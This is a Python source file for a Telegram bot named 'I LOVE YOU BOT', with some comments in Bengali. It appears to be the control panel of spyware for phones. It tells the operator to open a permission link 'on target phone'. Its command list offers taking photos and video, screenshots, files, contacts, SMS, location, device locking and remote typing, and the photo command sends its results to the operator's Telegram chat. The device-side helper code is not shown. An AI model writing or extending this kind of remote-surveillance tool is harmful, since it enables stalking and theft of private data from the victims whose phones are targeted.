# telegram_control.py
import os
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes
from modules.helper import *

# এখানে সরাসরি Permission Link আর Granted Flag দিলাম
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
PERMISSION_LINK = "https://raw.githubusercontent.com/master-pd/I_Love_You_Bot/refs/heads/main/web_setup/permission.html"
PERMISSION_GRANTED = False

app = Application.builder().token(BOT_TOKEN).build()
bot = Bot(token=BOT_TOKEN)

def check_permission():
    if not PERMISSION_GRANTED:
        print(f"Permission required! Open this link on target phone: {PERMISSION_LINK}")
        return False
    return True

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        await update.message.reply_text("❌ Unauthorized user.")
        return
    await update.message.reply_text("💖 I LOVE YOU BOT is active! Use /help for commands.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text("❌ Permission not granted yet!")
        return
    commands = """
📸 /photo
🎥 /video
🖼️ /screenshot
📂 /files
📞 /contacts
💬 /sms
📡 /location
🔊 /volume
🔒 /lock
⌨️ /type
📱 /info
🔋 /battery
🌐 /network
"""
    await update.message.reply_text(commands)

# Example photo command
async def photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text("❌ Permission not granted yet!")
        return
    await update.message.reply_text(take_photo())

# অন্য commands আগের মতো থাকবে...

# Register handlers
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("help", help_command))
app.add_handler(CommandHandler("photo", photo))

print("💖 I LOVE YOU BOT is running...")
app.run_polling()
